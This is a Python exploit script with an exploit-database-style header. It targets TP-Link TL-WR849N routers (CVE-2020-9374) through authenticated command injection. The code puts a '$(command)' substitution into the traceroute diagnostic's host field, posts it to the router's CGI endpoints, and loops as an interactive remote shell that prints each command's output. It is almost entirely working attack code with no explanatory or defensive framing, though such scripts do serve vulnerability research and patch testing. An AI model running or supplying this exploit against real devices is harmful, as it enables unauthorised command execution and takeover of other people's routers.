# Exploit Title: TP LINK TL-WR849N - Remote Code Execution
# Date: 2019-11-20
# Exploit Author: Elber Tavares
# Vendor Homepage: https://www.tp-link.com/
# Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware
# Version: TL-WR849N 0.9.1 4.16
# Tested on: linux, windows
# CVE : CVE-2020-9374


import requests

def output(headers,cookies):
    url = 'http://192.168.0.1/cgi?1'
    data = ''
    data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\x0d\x0a'
    data += 'diagnosticsState\x0d\x0a'
    data += 'X_TP_HopSeq\x0d\x0a'
    data += 'X_TP_Result\x0d\x0a'
    r = requests.post(url,data=data,headers=headers,cookies=cookies)
    saida = r.text
    filtro = saida.replace(': Name or service not known','')
    filtro = filtro.replace('[0,0,0,0,0,0]0','')
    filtro = filtro.replace('diagnosticsState=','')
    filtro = filtro.replace('X_TP_HopSeq=0','')
    filtro = filtro.replace('X_TP_Result=','')
    print(filtro[:-8])

def aceppt(headers,cookies):
    url = 'http://192.168.0.1/cgi?7'
    data = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\x0d\x0a'
    r = requests.post(url,data=data,headers=headers,cookies=cookies)
    output(headers,cookies)


def inject(command,headers,cookies):
    url = 'http://192.168.0.1/cgi?2'
    data = ''
    data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\x0d\x0a'
    data += 'maxHopCount=20\x0d\x0a'
    data += 'timeout=5\x0d\x0a'
    data += 'numberOfTries=1\x0d\x0a'
    data += 'host=\"$('+command+')\"\x0d\x0a'
    data += 'dataBlockSize=64\x0d\x0a'
    data += 'X_TP_ConnName=ewan_pppoe\x0d\x0a'
    data += 'diagnosticsState=Requested\x0d\x0a'
    data += 'X_TP_HopSeq=0\x0d\x0a'
    r = requests.post(url,data=data,headers=headers,cookies=cookies)
    aceppt(headers,cookies)



def main():
    cookies = {"Authorization": "Basic REPLACEBASE64AUTH"}
    headers = {'Content-Type': 'text/plain',
      'Referer': 'http://192.168.0.1/mainFrame.htm'}
    while True:
        command = input('$ ')
        inject(command,headers,cookies)


main()